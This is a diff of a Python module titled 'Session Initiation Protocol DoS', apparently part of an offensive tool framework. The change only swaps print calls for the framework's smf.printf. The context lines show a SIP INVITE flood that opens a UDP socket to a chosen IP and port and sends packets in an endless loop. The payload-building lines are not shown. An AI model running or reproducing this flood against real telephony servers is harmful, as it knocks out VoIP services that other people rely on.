@@ -1,5 +1,6 @@
 import socket
 import random
+import smf
 
 MOD_INFO = {
     "Name": "Session Initiation Protocol DoS",
@@ -23,7 +24,7 @@ def execute(options):
     port = int(options.get("PORT"))
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    print(f"[*] Starting SIP Invite Flood on {ip}:{port}")
+    smf.printf(f"[*] Starting SIP Invite Flood on {ip}:{port}")
     count = 0
     try:
         while True:
@@ -38,12 +39,12 @@ def execute(options):
             )
             sock.sendto(payload.encode(), (ip, port))
             count += 1
-            print(f"[!] Sent {count} packets...", end="\r")
+            smf.printf(f"[!] Sent {count} packets...", end="\r")
 
     except KeyboardInterrupt:
-        print(f"[*] Total packets > {count}")
+        smf.printf(f"[*] Total packets > {count}")
     except Exception as e:
-        print(f"ERROR: {e}")
+        smf.printf(f"ERROR =>", e)
     finally:
         sock.close()
     return True
